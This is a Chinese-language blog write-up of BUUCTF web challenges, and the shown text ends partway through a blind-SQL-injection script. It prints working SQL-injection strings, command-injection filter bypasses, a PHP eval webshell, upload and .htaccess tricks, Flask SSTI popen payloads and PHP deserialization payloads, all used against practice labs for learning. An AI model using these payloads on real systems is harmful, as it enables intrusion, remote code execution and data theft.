      <url>/2025/02/22/buuctf%20wp%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h3><blockquote><p>直接输入万能密码1’ or 1&#x3D;1#拿到flag<img src="/img/1q.jpg" alt="输入图片说明"></p></blockquote><h3 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h3><blockquote><p>使用hackber查看后发现使用get传入cat＝dog可以拿到flag<br><img src="/img/2q.jpg" alt="输入图片说明"><br><img src="/img/3q.jpg" alt="输入图片说明"></p></blockquote><h3 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h3><blockquote><p>查看后发现一个source.php,直接访问这个页面</p></blockquote><p><img src="/img/4q.jpg" alt="输入图片说明"></p><blockquote><p>发现需要代码审计，真正执行的是下面的这一部分，检查file的内容是否为空，是否是字符串，是否在白名单内，上面的代码就是检查，都符合后对file传入的内容进行文件包含<br><img src="/img/5q.jpg" alt="输入图片说明"></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>]; </span><br><span class="line"><span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;   <span class="keyword">echo</span> </span><br><span class="line"><span class="string">&quot;you can&#x27;t see it&quot;</span>;   </span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;   </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;  </span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>要求白名单内只允许出现source.php和hint.php，内容不能为空且是字符串</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(   </span><br><span class="line"><span class="variable">$page</span>,   </span><br><span class="line"><span class="number">0</span>,   </span><br><span class="line"><span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)   );   </span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;   </span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>mb_substr的在此处的作用是截取，0代表从最开始截取，截取到mb_strpots得到的数字，mb_strpos的在此处的作用是，找到其被拼接上一个?后，?首次出现的位置，看截取内容是否在白名单<br>这样我们就可以构造我们真正要包含的文件?file&#x3D;hint.php?..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;xxx,截取绕过白名单后，第二个?后面是我们真正包含的文件</p></blockquote><blockquote><p>传入hint.php后，我们能找到真正的flag存在的位置<img src="/img/6q.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>我们在第二个问号后直接传入真正的flag的位置后发现，是空白的网页，由此我们考虑可能在其他目录，然后我们进行目录穿越最终拿到flag<img src="/img/7q.jpg" alt="输入图片说明"></p></blockquote><h3 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h3><blockquote><p>题目名字提示我们这道题是文件包含题目，然后我们就要找到文件包含点，进去后发现只有一个tips，点进去后发现文件包含点，我们进行日志包含最终拿到flag</p></blockquote><p><img src="/img/8q.jpg" alt="输入图片说明"></p><blockquote><p>这里使用的是日志包含<img src="/img/9q.jpg" alt="输入图片说明"></p></blockquote><h3 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h3><blockquote><p>简单的rce考察<br>首先查看根目录的文件，找到flag<img src="/img/10q.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>然后查看flag就能拿到flag了<img src="/img/11q.jpg" alt="输入图片说明"></p></blockquote><h3 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h3><blockquote><p>首先我们查看当前目录的内容，发现flag.php，然后进行空格过滤的替换，再使用拼接法进行绕过<br>查看当前目录文件的时候，发现flag.php<br><img src="/img/12q.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>然后在查看flag.php的时候发现过滤了空格，我们使用$IFS$1进行绕过</p></blockquote><p><img src="/img/13q.jpg" alt="输入图片说明"></p><blockquote><p>我们又发现它过滤了flag关键词，我们使用拼接法进行绕过，最终拿到flag<br><img src="/img/14q.jpg" alt="输入图片说明"></p></blockquote><p><img src="/img/15q.jpg" alt="输入图片说明"></p><h3 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h3><blockquote><p>输入*,1后直接拿到flag<br><img src="/img/16q.jpg" alt="输入图片说明"></p></blockquote><h3 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h3><blockquote><p>没有任何限制的字符型sql注入</p></blockquote><blockquote><p>输入万能密码发现能进去1’ or 1&#x3D;1#<br>说明没过滤什么，并且是字符型注入</p></blockquote><p><img src="/img/17q.jpg" alt="输入图片说明"></p><blockquote><p>1’ order by 3#<br>一个一个尝试发现当4时出现不存在这一字段，说明表只有三列<img src="/img/18q.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>进行脱库<br>1’ union select 1,2,database()#<br>拿到库名为geek<br><img src="/img/19q.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>在拿表名<br>1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’geek’#<br><img src="/img/20q.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>拿到两张表，经过尝试发现flag是在第二个表上<br>我们来爆字段名<br>1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_schema&#x3D;’geek’ and table_name&#x3D;’l0ve1ysq1’#<img src="/img/21q.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>然后我们来爆字段<br>flag在password里<br>1’ union select 1,2,group_concat(password) from geek.l0ve1ysq1#<br>我们就能拿到flag<br><img src="/img/22q.jpg" alt="输入图片说明"></p></blockquote><h3 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h3><blockquote><p>考察的是堆叠注入<br>1’;show databases# 查所有库名<br>1’;show tables# 查所有的表名<br>1’;show columns from <code>表名</code>#<br>1’;prepare y from concat(‘sel’,’ect*from<code>表名</code>‘);execute y;#</p></blockquote><blockquote><p>拿到所有表名<img src="/img/23q.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>查看指定表名的所有列名<br><img src="/img/24q.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>我们发现这张表里有flag<br>然后我们直接看这张表的全部内容，就能拿到flag<br><img src="/img/25q.jpg" alt="输入图片说明"><br>我们发现这里过滤了select，我们要对select 进行绕过</p></blockquote><blockquote><p>1’;prepare y from concat(‘sel’,’ect*from<code>1919810931114514</code>‘);execute y ;#<br>我们就能拿到flag<br><img src="/img/26q.jpg" alt="输入图片说明"></p></blockquote><h3 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h3><blockquote><p>发现在这个页面还有一个页面<br><img src="/img/27q.jpg" alt="输入图片说明"></p></blockquote><p><img src="/img/28q.jpg" alt="输入图片说明"></p><blockquote><p>再次点击后发现提示已经查阅结束，那么在第二个网页和第三个网页肯定存在一点东西<br> 我们使用bp进行抓包可以看到另一个网址<img src="/img/29q.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>进入后是一段简单的文件包含代码，使用filter伪协议可以进行绕过<img src="/img/30q.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>base64解编码后我们就拿到了flag<img src="/img/31q.jpg" alt="输入图片说明"></p></blockquote><h3 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h3><blockquote><p>寻找能找到flag的地方，然后bp抓包后发现一个secret.php比较可疑，进去后按照提示就能拿到flag<img src="/img/32q.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>进去后说我们不是来自某某网址，我们直接bp抓包后给它改上去，referer:# <a href="https://sycsecret.buuoj.cn然后我们就能进入下一步提示/">https://Sycsecret.buuoj.cn然后我们就能进入下一步提示</a><br><img src="/img/33q.jpg" alt="输入图片说明"></p></blockquote><p><img src="/img/34q.jpg" alt="输入图片说明"></p><blockquote><p>这里要求我们使用这个浏览器，我们直接修改user-Agent为这个就可以进入下一步<br><img src="/img/35q.jpg" alt="输入图片说明"><br>最后一个是要求我们在本地，我们直接添加X-Forwarded-For:127.0.0.1就可以拿到最终的flag<br><img src="/img/36q.jpg" alt="输入图片说明"></p></blockquote><h3 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h3><blockquote><p>进去后发现一个上传点，我们上传一个含有一句话木马的jpg图片，将后缀修改为php<br><img src="/img/37q.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>在发现php后缀不行的时候，我们可以使用几种可以代替php的后缀，如php3,php5,phtml，试验后发现phtml可以</p></blockquote><p><img src="/img/38q.jpg" alt="输入图片说明"></p><blockquote><p>然后发现不能用&lt;?那么我们的一句话木马就需要修改以下形式，查一下php7中文手册，找到了可以替代&lt;?的语句<img src="/img/39q.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>使用这个后就能进行上传<img src="/img/40q.jpg" alt="输入图片说明"></p><p>遇到下面的情况的时候，只需要添加GIF89a，让它识别为图片就可以<img src="/img/41q.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>然后他没有给我们上传图片的路径，我们直接猜路径为&#x2F;upload&#x2F;1.html，没告诉的时候，一般是&#x2F;upload&#x2F;xxxx<br>执行rce最终拿到flag<br><img src="/img/42q.jpg" alt="输入图片说明"></p></blockquote><h3 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h3><blockquote><p>菜刀+一句话木马<br>这里已经提示的很明显了，直接用蚁剑连接，就能拿到flag<br><img src="/img/43q.jpg" alt="输入图片说明"></p></blockquote><blockquote><p><img src="/img/44q.jpg" alt="输入图片说明"><img src="/img/45q.jpg" alt="输入图片说明"></p></blockquote><h3 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h3><blockquote><p>直接上传一张含有一句话木马的图片，将后缀修改为phtml就可以正常上传<br>这里不是默认路径了，我们使用bp可以看到正确的上传路径</p></blockquote><p><img src="/img/46q.jpg" alt="输入图片说明"></p><blockquote><p>访问后使用rce，拿到flag<br><img src="/img/47q.jpg" alt="输入图片说明"></p></blockquote><h3 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h3><blockquote><p>考察的是基本的sql，虽然过滤了很多东西，但是通过双写绕过，就可以全部进行绕过,这是这道题的全部思路<img src="/img/48q.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>输入1’ or 1&#x3D;1#后，出现语句错误，那么我们可以猜测过滤了or,输入1’ oorr 1&#x3D;1#后可以登录<br><img src="/img/49q.jpg" alt="输入图片说明"></p></blockquote><p><img src="/img/50q.jpg" alt="输入图片说明"><img src="/img/51q.jpg" alt="输入图片说明"></p><blockquote><p>然后我们来爆字段数，最终发现为四段，并且这里过滤了by,我们可以使用bbyy进行代替<img src="/img/52q.jpg" alt="输入图片说明"><img src="/img/53q.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>然后我们来爆库名<br>这里经过尝试后发现过滤了union和select,双写绕过即可<br>1’ ununionion seselectlect 1,2,database()#<br><img src="/img/54q.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>然后来爆表名<br>1’ ununionion seselectlect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema&#x3D;’geek’#<br>这里还过滤了from,where<br><img src="/img/55q.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>然后我们来爆字段名<br>1’ ununionion seselectlect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_schema&#x3D;’geek’ aandnd table_name&#x3D;’b4bsql’#<br>这里还过滤了and<br><img src="/img/56q.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>最后我们爆字段的内容拿到flag<br>1’ ununionion seselectlect 1,2,group_concat(passwoorrd) frfromom geek.b4bsql#<br><img src="/img/57q.jpg" alt="输入图片说明"></p></blockquote><h3 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h3><blockquote><p>首先经过尝试和题目提示访问index.php.bak<br>我们能拿到下面的文本，意思是key只能是文本并且和str是弱相等，根据弱相等123aa&#x3D;&#x3D;123，所以我们直接传如key&#x3D;123，拿到flag</p><p><img src="/img/58q.jpg" alt="输入图片说明"></p></blockquote><blockquote></blockquote><p><img src="/img/59q.jpg" alt="输入图片说明"></p><blockquote></blockquote><h3 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h3><blockquote><p>这里有好几层验证，身份，弱相等，科学计数法</p></blockquote><blockquote><p>首先我们发现有第二个网页，这里有flag的信息<img src="/img/60q.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>要求我们必须是它的学生，经过一番尝试后，发现cookie有个user符合题意，user是0，改为1后就可以进入下一步了<img src="/img/61q.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>password要求和404弱i相等，还要不只包含数字，password&#x3D;404a可以绕过<img src="/img/62q.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>然后需要我们支付money，直接传入money&#x3D;100000000的话会显示太长了不行，于是我们使用科学计数法来代替.输入money&#x3D;1e9绕过，最终拿到flag<img src="/img/63q.jpg" alt="输入图片说明"></p></blockquote><h3 id="NewStarCTF-2023-公开赛道-include-0。0"><a href="#NewStarCTF-2023-公开赛道-include-0。0" class="headerlink" title="[NewStarCTF 2023 公开赛道]include 0。0"></a>[NewStarCTF 2023 公开赛道]include 0。0</h3><blockquote><p>题目中过滤了base和rot，那么使用filter的相应部分就没用了，尝试了日志包含和session包含都出不来，data伪协议也不行，最终使用了远程文件包含拿到flag</p></blockquote><p><img src="/img/64q.jpg" alt="输入图片说明"></p><blockquote><p>远程下载一个一句话木马<?php eval($_POST[1]);?><br>然后访问题目中画圈处，使用post传参，1&#x3D;system(“tac ..&#x2F;..&#x2F;..&#x2F;flag.php”);?&gt;拿到flag<br><img src="/img/65q.jpg" alt="输入图片说明"><br><img src="/img/66q.jpg" alt="输入图片说明"></p></blockquote><h3 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h3><blockquote><p>输入东西后发现没有回显，尝试找找有没有攻入点，BP抓包后发现一具sql语句<img src="/img/67q.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>这里我们使用MD5的万能密码ffifdyop会可以进行绕过<br>输入后进入另一个页面<img src="/img/68q.jpg" alt="输入图片说明"></p></blockquote><p><img src="/img/69q.jpg" alt="输入图片说明"></p><blockquote><p>查看源代码后发现考察的是MD5的弱相等绕过<br>这里有两个方法<br>方法一：数组绕过<br>a[]&#x3D;1&amp;b[]&#x3D;2<br>方法二：使用特殊的值</p></blockquote><p>byGcY<br>0e591948146966052067035298880982</p><p>QNKCDZO<br>0e830400451993494058024219903391</p><p>s878926199a<br>0e545993274517709034328855841020</p><p>s155964671a<br>0e342768416822451524974117254469</p><p>s214587387a<br>0e848240448830537924465865611904</p><p>s214587387a<br>0e848240448830537924465865611904</p><p>s878926199a<br>0e545993274517709034328855841020</p><p>s1091221200a<br>0e940624217856561557816327384675</p><p>s1885207154a<br>0e509367213418206700842008763514</p><p>240610708<br>0e462097431906509019562988736854</p><p>314282422<br>0e990995504821699494520356953734</p><p>571579406<br>0e972379832854295224118025748221</p><p>903251147<br>0e174510503823932942361353209384</p><blockquote><p>上面的随便找两个就可以进行绕过，例如输入a&#x3D;byGcY&amp;b&#x3D;QNKCDZO</p></blockquote><blockquote><p>绕过后发现考察MD5的强相等绕过，可以使用上面在绕过弱相等时使用的数组绕过<br><img src="/img/70q.jpg" alt="输入图片说明"><img src="/img/71q.jpg" alt="输入图片说明"></p></blockquote><h3 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h3><blockquote><p>首先第一层是<code>if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;welcome to the zjctf&quot;))&#123;   echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#39;r&#39;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;</code><br>即读取里面的内容，并且内容与要求的相等<br>这里可以使用data伪协议进行绕过，我们知道data:&#x2F;&#x2F;text&#x2F;plain&#x2F;,后面如果没有&lt;?php的话就会被当为文本执行，这里可以利用这个特性写入</p></blockquote><blockquote><p>text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain&#x2F;,welcome to the zjctf<img src="/img/72q.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>成功进入下一层，然后要求我们file的内容不能含有flag，我们使用filter伪协议进行绕过<br>file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;useless.php<br><img src="/img/73q.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>进行base64解码<br><img src="/img/74q.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>考察的是反序列化知识<br>这里使用到了__toString魔术方法，直接输出对象引用则会自动调用对象中的__toString()方法<br><img src="/img/75q.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>题目中的password会进行反序列化直接输出，从而自动调用__toString魔术方法，我们只需要传入正常序列化的语句即可<img src="/img/76q.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>反序列化后拿到最终payload<img src="/img/77q.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>这里我们要执行这个else，因而file的值要改为错误的值<br>所以最终payload为<br>text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain&#x2F;,welcome to the zjctf&amp;file&#x3D;useless.php&amp;password&#x3D;O%3A4%3A%22Flag%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D</p></blockquote><blockquote><p>然后查看网页源代码拿到flag<img src="/img/78q.jpg" alt="输入图片说明"></p></blockquote><h3 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h3><blockquote><p>孙笑川坏事做尽<br>我与孙笑川不共戴天</p></blockquote><blockquote><p>首先创建一个.htaccess文件，内容写AddType application&#x2F;x-httpd-php .jpg作用是让我们传入带有一句话木马的jpg图片的时候，不需要改后缀，就可以直接执行php代码</p></blockquote><blockquote><p>首先BP抓包<img src="/img/79q.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>这里需要过滤，将Content-TYpe的内容改为image&#x2F;jpeg绕过<img src="/img/80q.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>然后传入图片马<img src="/img/81q.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>蚂剑连接<img src="/img/82q.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>拿到flag<img src="/img/83q.jpg" alt="输入图片说明"></p></blockquote><h3 id="Flask-SSTI"><a href="#Flask-SSTI" class="headerlink" title="[Flask]SSTI"></a>[Flask]SSTI</h3><blockquote><p>根据题目提示，这道题考的是ssti模板注入<br>因为没什么过滤，直接传<br><code> http://node5.buuoj.cn:28273/?name=&#123;&#123;"".__class__.__base__.__subclasses__()[117].__init__.__globals__['popen']('ls /')['read']()&#125;&#125;</code><br><img src="/img/1buuctf.png" alt="输入图片说明"></p></blockquote><blockquote><p>这里都看了，但是就是没有flag<br>然后找找找,发现flag在环境变量里<br><code>?name=&#123;&#123;"".__class__.__base__.__subclasses__()[117].__init__.__globals__['popen']('env')['read']()&#125;&#125;</code><br><img src="/img/2buuctf.png" alt="输入图片说明"></p></blockquote><h3 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h3><blockquote><p>这道题考察的是反序列化的pop链</p></blockquote><blockquote><p><code>is_valid</code>的作用是检查是否存在不可见字符，这里要求不能存在不可见字符<br><code>protected $op;   protected $filename;   protected $content;</code>这三个都是用的是protected，在反序列化的时候是 %00+*+%00+属性名，这里的%00属于不可见字符，因而不能存在，后面需要将属性改为public<br>pop链在构造的时候只需要保留修改值的地方就可以，其他的地方全部删掉<br>pop链修改时，做出改变的__construct魔术方法会对题目中原来的__construct进行覆盖,因而题目中的__construct是利用不了的，我们可以利用__destruct魔术方法进行解题<br>__destruct魔术方法中的<code>if($this-&gt;op === &quot;2&quot;)</code>是强项等，如果相等的话就会执行<code>$this-&gt;op = &quot;1&quot;;</code>，因而我们需要进行绕过，op&#x3D;1就可以绕过，因为__destruct中的op是字符串2，而我们传入的是数字2，这两个不是强相等，而是弱相等</p></blockquote><blockquote><p>题目中的write方法是混淆视听用的，没有作用</p></blockquote><blockquote><p>我们要利用的是read函数中的<code>$res = file_get_contents($this-&gt;filename);</code></p></blockquote><blockquote><p>综上，代码奉上</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$op</span>= <span class="number">2</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$content</span>=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="variable">$op</span> = <span class="number">2</span>;</span><br><span class="line"><span class="variable">$filename</span> = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">FileHandler</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><blockquote><p>最终的payload是?str&#x3D;O:11:”FileHandler”:3:{s:2:”op”;i:2;s:8:”filename”;s:8:”flag.php”;s:7:”content”;s:1:”1”;}<img src="/img/3buuctf.png" alt="输入图片说明"></p></blockquote><h3 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h3><blockquote><p>点进去观察到网址处有个filename和filehash结合题目提示，应该是让我们找这个filehash值<br><img src="/img/4buuctf.png" alt="输入图片说明"></p></blockquote><blockquote><p>这里的filename应该就是这个</p></blockquote><blockquote><p>因为题目是tornado，所以这里应该考察的是ssti模板注入，我们要找的是密码<br>修改一下网址后进入到这个页面，尝试了一下，发现果然是模板注入<img src="/img/5buuctf.png" alt="输入图片说明"><br><img src="/img/6buuctf.png" alt="输入图片说明"></p></blockquote><blockquote><p>这里我们传入&#x2F;error?msg&#x3D;<br>作用是查看环境变量，在环境变量里发现密码<img src="/img/7buuctf.png" alt="输入图片说明"></p></blockquote><blockquote><p>根据题目中提示的加密方法进行加密<img src="/img/8buuctf.png" alt="输入图片说明"></p></blockquote><blockquote><p><img src="/img/9buuctf.png" alt="输入图片说明"><img src="/img/10buuctf.png" alt="输入图片说明"></p></blockquote><blockquote><p>传入后拿到flag</p></blockquote><p><img src="/img/11buuctf.png" alt="输入图片说明"></p><h3 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h3><blockquote><p>这里考察的是ssti</p></blockquote><p><img src="/img/12buuctf.png" alt="输入图片说明"></p><blockquote><p>首先进行代码审计，FLAG在config里，但是config和self又在黑名单里无法使用，我们要找config从而找到flag<br>要从父类开始寻找<br>使用<br>查看全局变量<br>再使用<br>读到当前app<br>再读取config拿到flag</p><p><img src="/img/13buuctf.png" alt="输入图片说明"><img src="/img/14buuctf.png" alt="输入图片说明"><img src="/img/15buuctf.png" alt="输入图片说明"></p></blockquote><h3 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h3><p><img src="/img/16buuctf.png" alt="输入图片说明"></p><blockquote><p>首先根据提示，表名和字段名都是flag，我们只需要进行爆字段就可以了，尝试了一下，报错的形式是bool(false)</p></blockquote><blockquote><p>像extractvalue,updataxml,union等都被过滤了，结合返回值是bool，这可能是布尔注入</p></blockquote><p>脚本奉上</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 二分法</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://fc5c6b7f-8c09-4512-9899-e08b3e49d548.node5.buuoj.cn:81/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">i = i + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">letf = <span class="number">32</span></span><br><span class="line"></span><br><span class="line">right = 